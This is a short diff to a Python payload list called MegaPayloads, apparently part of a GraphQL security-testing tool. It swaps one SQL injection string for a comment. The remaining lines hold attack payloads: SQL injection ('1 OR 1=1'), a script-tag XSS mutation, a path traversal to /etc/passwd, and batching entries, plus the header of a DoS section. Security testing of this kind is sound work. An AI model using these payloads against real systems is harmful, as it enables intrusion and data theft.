@@ -727,7 +727,7 @@ class MegaPayloads:
         '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]',
         # 注入测试
         '{"query":"query{user(id:\\"1 OR 1=1\\"){name}}"}',
-        '{"query":"query{user(id:\\"1\\\' OR \\'1\\'=\\'1\\"){name}}"}',
+        # GraphQL SQL Injection payload (simplified)
         '{"query":"mutation{createUser(name:\\"<script>alert(1)</script>\\"){id}}"}',
         '{"query":"query{user(id:\\"../../../etc/passwd\\"){name}}"}',
         # DoS
